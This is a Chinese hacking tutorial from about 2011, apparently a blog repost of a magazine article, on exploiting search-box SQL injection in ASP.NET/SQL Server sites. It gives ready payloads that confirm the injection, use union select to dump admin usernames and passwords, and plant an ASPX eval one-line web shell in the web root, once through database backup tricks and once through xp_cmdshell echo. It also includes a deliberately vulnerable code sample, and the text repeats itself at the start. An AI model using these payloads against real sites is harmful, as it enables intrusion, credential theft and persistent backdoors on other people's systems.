@@ -1,0 +1,356 @@
+利用get方式的搜索型注入拿站   
+YesCK , 2011/02/13 18:46 , 资源资料 , 评论(0) , 阅读(793) , Via 本站原创 引用地址： 
+注意： 该地址仅在今日23:59:59之前有效
+在搜索框里，我们输入一个关键词，该关键词必须在这个站能搜索到信息。比如这个站，我输入了1，搜索到了很多新闻。
+
+判断这个搜索框是否有注入漏洞。
+
+我们在搜索框内输入1%' and 1=1 and '%'='
+返回正常
+
+
+我们在搜索框内输入1%' and 1=2 and '%'='
+返回异常
+对不起，没有找到相关新闻
+可以确定这是个注入点了
+
+我们在搜索框里，搜索关键词1浏览器地址栏显示：http://www.XXXXXX.com/News_search.asp?key=1&otype=msg
+
+这里的key=1，就是说我们搜索得关键词1。我们要做的就是吧key=1放到最后面，把连接变成
+http://www.XXXXXX.com/News_search.asp?otype=msg&key=1，或者直接把&otype=msg删除，变成http://www.XXXXXX.com/News_search.asp?key=1
+
+
+拿工具来挂进去就可以了 
+
+
+
+我们在搜索框输入张%' and '1'='1' and '%'='
+然后输入       张%' and '1'='2' and '%'='查询结果如图4
+
+
+
+
+其实这个时候脚本中的查询SQL语句是这样的：
+
+“SELECT*from sqltest where names like'%张%'and'1'='1'and'%'='%'”现在彻底明白注入的原理了吧.
+
+输入  张%' and '1'='1'  and '%'='%'order  by 5 --
+
+段数为4个,到这时候入侵者会先爆破出后台密码然后后台获取Webshell
+
+我们接着输入  张%' and'1'='1'  and '%'='%'  union select '1','2','3','4'--
+
+张%' and'1'='1'  and '%'='%'  union select adminPass,adminName,adminId,'4'from admin--
+
+会把密码，用户名，用户ID，的值都爆出来
+
+
+
+
+---------------关于DB权限下获取webshell
+
+
+备份的时候会用到数据库名，在搜索框输入
+
+张%' and'1'='1'and '%'='%' union select db_name (),'2','3','4'--
+
+就爆出了当前数据库名
+
+
+
+备份的时候会用到数据库名，在搜索框输入
+
+张%' and'1'='1'and '%'='%' union select db_name(),'2','3','4'--
+
+就爆出了当前数据库名
+
+
+然后非别在搜索框非别输入以下5条语句执行。
+
+No1————备份当前数据库
+
+张%' and '1'='1'and '%'='%';declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x6861636B6572 backup database @a to disk=@s--
+
+这条语句是备份当前数据库，“db_name()”为获取当前数据库名
+
+0x6861636B6572为 数据库名 16进制，执行成功。
+
+No2———— 创建Feitest表
+
+张%'and '1'='1' and '%'='%';create table[dbo].[Feitest]([cmd] [image])-- 
+
+这条语句是创建表，执行成功创建 Feitest表成功 
+
+No3———— 插入一句话木马
+
+张%'and '1'='1'and '%'='%';Insert into Feitest(cmd) values(' <%@ PageLanguage="Jscript" validateRequest="false"%><%Response.Write(eval(Request.Item["w"],"unsafe"));%>')--
+
+ 
+
+这句就是在Feites表里插入一句话，在插入aspx一句话的时候不要转换成16进制的，我转换成16进制的插入备份后，不能正常使用，不转换则可以，不知道什么原因.。知道原因的大牛们解答下，，
+
+
+
+No4———— 备份一个一句话到Web
+
+张%' and '1'='1'and '%'='%';declare @a sysname,@s varchar(4000) select@a=db_name(),@s=0x443A5C4D7920446F63756D656E74735C56697375616C2053747564696F20323030385C57656253697465735C57656253697465315C466569546573742E61737078backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT--”
+
+语句中的
+
+“0x443A5C4D7920446F63756D656E74735C56697375616C2053747564696F20323030385C57656253697465735C57656253697465315C466569546573742E61737078”是转换后的16进制web路径，没有转换前为
+
+D:\My Documents\Visual Studio 2008\WebSites\WebSite1\FeiTest.aspx
+
+执行这句后会生产一个Feitest.aspx的文件到Web目录下生成的也就是一句话，
+
+备份成功
+
+
+No5-------删除刚才建立的表
+
+张%' and '1'='1'and '%'='%';drop table Feitest--
+
+这句是删除刚才创建的Feitest表，
+
+ 
+
+现在我们用一句话客户端连接就传个我自己写的小马上去如图14
+
+上传成功。
+
+
+关于DB权限告一段落。
+
+
+
+
+《搜索型注入原理详细解析》
+
+作者:菲&王兴东
+
+ 本文已发表在黑客x档案 转载注明作者
+
+以前自己刚接触注入的时候看教程上那些大牛在注入点输入 union selec ，user(), 就能爆出初需要的信息,感觉很牛X那时候自己是个超级菜菜后来经过自己研究,终于弄明白了原理,把我的理解写出来和当是像我一样菜的菜鸟共享少走点弯路。
+
+SQL注入原理
+
+关于注入的形成由于程序员在编写代码的时候对获取的值过滤不严,直接带入数据库查询而产生的。这样我门就可以精心构造sql语句达到攻击的目的就形成了注入，我用自己写的一个带搜索型注入的ASP.NET脚本帮大家理解。
+
+ 
+
+测试环境: ASP.NET+ SQL server2005
+
+ 
+
+____ASP.NET代码:
+
+protected void Button1_Click(object sender, EventArgs e)
+
+    {
+
+        string connuser= @"Data Source=PC-200908050033\SQLEXPRESS;InitialCatalog=hacker;Integrated Security=True";
+
+        string sql=string.Format("SELECT * from sqltest where names like'%{0}%'",TextBox1.Text);//注入形成的主要原因，TextBox1.Text没有经过任何处理就带入到了Sql语句
+
+        SqlConnectionconn = new SqlConnection(connuser);
+
+        conn.Open();
+
+        SqlCommand comm= new SqlCommand(sql, conn);
+
+        SqlDataReaderreder =comm.ExecuteReader();
+
+        while(reder.Read())                                                                                       
+
+    {
+
+        Label2.Text +=reder[0].ToString() + "&nbsp &nbsp &nbsp" +reder[1].ToString() + "&nbsp &nbsp &nbsp &nbsp "
+
+         +reder[2].ToString() + "&nbsp &nbsp &nbsp &nbsp&nbsp" + reder[3].ToString() + "<br>";
+
+    }
+
+        
+
+        conn.Close();
+
+}
+
+______数据库:
+
+数据库建库建表代码我就不贴出来了,数据库我会打包跟大家就不贴代码了为黑X节省点版面 ,关于数据库的结构如图1
+
+
+Admin表保存管理员账户密码信息，sqltest 保存用户信息
+
+ 
+
+No1…..漏洞形成分析
+
+   漏洞形成
+
+   string sql=string.Format("SELECT * from sqltest where names like '%{0}%'",TextBox1.Text)
+
+    SqlConnection conn= new SqlConnection(connuser);
+
+    conn.Open();
+
+SqlCommand comm = newSqlCommand(sql, conn);
+
+TextBox1.Text 的值是用户输入要查询的关键字，然后带到Sql语句里执行,TextBox1.Text的值没有经过任何处理就带到了数据库查询，注入漏洞也就产生了，
+
+   
+
+No2….脚本中用到的搜索sql语句分析
+
+语句如下
+
+SELECT * from sqltest where names like'%要查询的关键字%'
+
+解释下：“%”匹配任何字符， “like” 的意思就是像
+
+比如我们在搜索框输入关键字 “张”那么SQL语句就变成了
+
+SELECT * from sqltest where names like'%张%'
+
+这条SQL语句的意思就是，查询 names列里面的数据带有关键字“张”的。如图2
+
+
+如果我们在输入关键字的时候不是输入的关键字“张”而是精心构造的SQL,并且对于输入的关键字也没有过滤注入就形成了，现在不明白注入原理的朋友应该明白了把。
+
+ 
+
+No3….关于漏洞的利用测试
+
+现在我以一个入侵者的角度来模拟一下入侵，演示怎么非用“union select”语句爆用户名密码,和在DB和SA权限下怎么获取webshell..
+
+作为一个入侵者首先要判断是否存在注入我们在搜索框输入“张%' and '1'='1' and '%'='”查询的结果如图3
+
+
+其实这个时候脚本中的查询SQL语句是这样的：
+
+“SELECT*from sqltest where names like'%张%'and'1'='1'and'%'='%'”现在彻底明白注入的原理了吧.
+
+然后输入“张%' and '1'='2' and '%'='”查询结果如图4
+
+
+两次查询出来的结果不同确定存在注入。
+
+接下来判断下字段长度在搜索框输入“张%' and '1'='1'  and '%'='%' order  by 4 --”
+
+返回正常页面如图5
+
+
+输入“张%' and '1'='1'  and '%'='%'order  by 5 --”的时候返回错误如图6
+
+
+ 
+
+可以确定字段数为4个,到这时候入侵者会先爆破出后台密码然后后台获取Webshell
+
+我们接着输入“张%' and'1'='1'  and '%'='%'  union select '1','2','3','4'--”就返回了字段在页面相应的位置如图7
+
+
+下面我们来模拟爆破管理员密码Admin表里面保存了用户名和密码, “adminPass”是密码列“adminName”用户名列  “adminId”用户ID列 , 我们是测试知道“Admin”表里这些列的名称，在实际的入侵中只能一个一个的去猜表名和列名，还有就是在用“Union select”查询的时候需要注意类型匹配比如“Admin”表中的第一列是“adminId”是 int类型而 sqltest表中的第一列“Names”列是varchar类型如果我们让他们两个去匹配就会出错,如果我们在搜索框输入：
+
+“张%' and'1'='1'  and '%'='%' union selectadminId,adminName,adminPass,'4' from admin--”
+
+让Names 列去匹配adminid列就会出错如图8
+
+
+Sqltest 表中的Age列是int类型我们把adminId列换到对应age列的位置然后输入：
+
+“张%' and'1'='1'  and '%'='%'  union select adminPass,adminName,adminId,'4'from admin--”这样就不会出错了因为这两个列都是int类型就会把密码，用户名，用户ID，的值都爆出来了如图9
+
+
+由于我没有写后台就不跟大家演示后台获取Webshell 了希望大家谅解。
+
+ 
+
+---------------关于DB权限下获取webshell 
+
+ 
+
+在DB权限下可以备份拿到一个WEBSHELL到web目录，WEB路径我就不找了，自己本机架设的平台。路径是：D:\My Documents\VisualStudio 2008\WebSites\WebSite1
+
+备份的时候会用到数据库名，在搜索框输入
+
+“张%' and'1'='1'and '%'='%' union select db_name(),'2','3','4'--”
+
+就爆出了当前数据库名，如图10
+
+
+然后非别在搜索框非别输入以下5条语句执行。
+
+No1————备份当前数据库
+
+“张%' and '1'='1'and '%'='%';declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x6861636B6572 backup database @a to disk=@s--”
+
+这条语句是备份当前数据库，“db_name()”为获取当前数据库名
+
+0x6861636B6572为 数据库名 16进制，执行成功。我就不截图了。
+
+ 
+
+No2———— 创建Feitest表
+
+“张%'and '1'='1' and '%'='%';create table[dbo].[Feitest]([cmd] [image])-- “
+
+这条语句是创建表，执行成功创建 Feitest表成功 如图11
+
+
+No3———— 插入一句话木马
+
+张%'and '1'='1'and '%'='%';Insert into Feitest(cmd) values(' <%@ PageLanguage="Jscript" validateRequest="false"%><%Response.Write(eval(Request.Item["w"],"unsafe"));%>')--
+
+ 
+
+这句就是在Feites表里插入一句话，在插入aspx一句话的时候不要转换成16进制的，我转换成16进制的插入备份后，不能正常使用，不转换则可以，不知道什么原因.。知道原因的大牛们解答下，，执行成功如图12
+
+
+No4———— 备份一个一句话到Web
+
+“张%' and '1'='1'and '%'='%';declare @a sysname,@s varchar(4000) select@a=db_name(),@s=0x443A5C4D7920446F63756D656E74735C56697375616C2053747564696F20323030385C57656253697465735C57656253697465315C466569546573742E61737078backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT--”
+
+语句中的
+
+“0x443A5C4D7920446F63756D656E74735C56697375616C2053747564696F20323030385C57656253697465735C57656253697465315C466569546573742E61737078”是转换后的16进制web路径，没有转换前为
+
+“D:\My Documents\Visual Studio 2008\WebSites\WebSite1\FeiTest.aspx”
+
+执行这句后会生产一个Feitest.aspx的文件到Web目录下生成的也就是一句话，
+
+备份成功如图13
+
+
+No5-------删除刚才建立的表
+
+“张%' and '1'='1'and '%'='%';drop table Feitest--”
+
+这句是删除刚才创建的Feitest表，
+
+ 
+
+现在我们用一句话客户端连接就传个我自己写的小马上去如图14
+
+上传成功。
+
+
+关于DB权限告一段落。
+
+ 
+
+————关于SA权限获取Webshell
+
+  SA权限相对Db权限下要容易的多，方法也很多，如果能执行命令并且3389也打开了直接加账户就搞定了但是那样的很难遇到，关于获取webshell，Web路径已经知道了我们直接用echo命令弄个Webshell到web目录下，关于echo命令中一个“>”表示不在源文件上追加“>>”表示追加内容，前提是XP_cmdshell存在，我们在搜索框输入
+
+exec master..xp_cmdshell 'echo ^<%@ PageLanguage="Jscript" validateRequest="false" %^>^<%Response.Write(eval(Request.Item["w"],"unsafe"));%^>>D:\MyDocuments\Visual Studio 2008\WebSites\WebSite1\hacker.aspx'--
+
+直接就可以echo进去一个一句话到web目录下，点击搜索返回正常写入一句话成功，
+
+ 
+
+
+
+
+
